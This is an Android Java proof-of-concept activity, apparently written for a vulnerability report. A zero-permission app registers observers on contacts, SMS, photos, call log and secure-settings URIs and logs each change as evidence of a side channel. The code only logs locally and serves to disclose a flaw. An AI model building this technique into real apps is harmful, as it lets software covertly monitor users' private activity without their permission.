package com.vrp.zeroperm;

import android.app.Activity;
import android.content.ContentResolver;
import android.database.ContentObserver;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

public class ObserverProofActivity extends Activity {
    private static final String T = "OBSPROOF";
    private int changeCount = 0;

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        Log.w(T, "=== ContentObserver Side Channel Proof ===");
        Log.w(T, "UID=" + android.os.Process.myUid());
        Log.w(T, "Registering observers on protected URIs...");

        ContentResolver cr = getContentResolver();
        Handler h = new Handler(Looper.getMainLooper());

        // Register observer on contacts
        try {
            cr.registerContentObserver(
                Uri.parse("content://com.android.contacts/contacts"),
                true,
                new ContentObserver(h) {
                    @Override
                    public void onChange(boolean selfChange) {
                        changeCount++;
                        Log.w(T, "[!!!] CONTACTS CHANGED (selfChange=" + selfChange + ") count=" + changeCount);
                    }
                    @Override
                    public void onChange(boolean selfChange, Uri uri) {
                        changeCount++;
                        Log.w(T, "[!!!] CONTACTS CHANGED uri=" + uri + " (selfChange=" + selfChange + ") count=" + changeCount);
                    }
                });
            Log.w(T, "[+] Contacts observer registered");
        } catch (Exception e) {
            Log.w(T, "[-] Contacts observer: " + e.getClass().getSimpleName());
        }

        // Register observer on SMS
        try {
            cr.registerContentObserver(
                Uri.parse("content://sms"),
                true,
                new ContentObserver(h) {
                    @Override
                    public void onChange(boolean selfChange) {
                        changeCount++;
                        Log.w(T, "[!!!] SMS CHANGED (selfChange=" + selfChange + ") count=" + changeCount);
                    }
                    @Override
                    public void onChange(boolean selfChange, Uri uri) {
                        changeCount++;
                        Log.w(T, "[!!!] SMS CHANGED uri=" + uri + " (selfChange=" + selfChange + ") count=" + changeCount);
                    }
                });
            Log.w(T, "[+] SMS observer registered");
        } catch (Exception e) {
            Log.w(T, "[-] SMS observer: " + e.getClass().getSimpleName());
        }

        // Register observer on photos/media
        try {
            cr.registerContentObserver(
                Uri.parse("content://media/external/images/media"),
                true,
                new ContentObserver(h) {
                    @Override
                    public void onChange(boolean selfChange) {
                        changeCount++;
                        Log.w(T, "[!!!] PHOTOS CHANGED (selfChange=" + selfChange + ") count=" + changeCount);
                    }
                    @Override
                    public void onChange(boolean selfChange, Uri uri) {
                        changeCount++;
                        Log.w(T, "[!!!] PHOTOS CHANGED uri=" + uri + " (selfChange=" + selfChange + ") count=" + changeCount);
                    }
                });
            Log.w(T, "[+] Photos observer registered");
        } catch (Exception e) {
            Log.w(T, "[-] Photos observer: " + e.getClass().getSimpleName());
        }

        // Register observer on call log
        try {
            cr.registerContentObserver(
                Uri.parse("content://call_log/calls"),
                true,
                new ContentObserver(h) {
                    @Override
                    public void onChange(boolean selfChange, Uri uri) {
                        changeCount++;
                        Log.w(T, "[!!!] CALL LOG CHANGED uri=" + uri + " count=" + changeCount);
                    }
                });
            Log.w(T, "[+] Call log observer registered");
        } catch (Exception e) {
            Log.w(T, "[-] Call log observer: " + e.getClass().getSimpleName());
        }

        // Register on Settings.Secure
        try {
            cr.registerContentObserver(
                Uri.parse("content://settings/secure"),
                true,
                new ContentObserver(h) {
                    @Override
                    public void onChange(boolean selfChange, Uri uri) {
                        changeCount++;
                        Log.w(T, "[!!!] SETTINGS.SECURE CHANGED uri=" + uri + " count=" + changeCount);
                    }
                });
            Log.w(T, "[+] Settings.Secure observer registered");
        } catch (Exception e) {
            Log.w(T, "[-] Settings observer: " + e.getClass().getSimpleName());
        }

        Log.w(T, "=== OBSERVERS REGISTERED — NOW TRIGGERING CHANGES ===");

        // Now trigger changes to test if observers fire

        // Trigger a settings change (we can read but not write, so use ADB)
        Log.w(T, "[*] Observers will fire when data changes.");
        Log.w(T, "[*] Test: Insert a contact via ADB to verify observer fires");
        Log.w(T, "[*] Waiting for changes...");

        // Schedule a check after 10 seconds
        h.postDelayed(new Runnable() {
            @Override
            public void run() {
                Log.w(T, "=== 10-SECOND CHECK: " + changeCount + " changes detected ===");
                if (changeCount > 0) {
                    Log.w(T, "[!!!] SIDE CHANNEL CONFIRMED — zero-perm app detected " + changeCount + " data changes!");
                } else {
                    Log.w(T, "[.] No changes detected in 10 seconds");
                }
            }
        }, 10000);

        // Keep alive for 30 seconds
        h.postDelayed(new Runnable() {
            @Override
            public void run() {
                Log.w(T, "=== 30-SECOND FINAL: " + changeCount + " total changes detected ===");
            }
        }, 30000);
    }
}
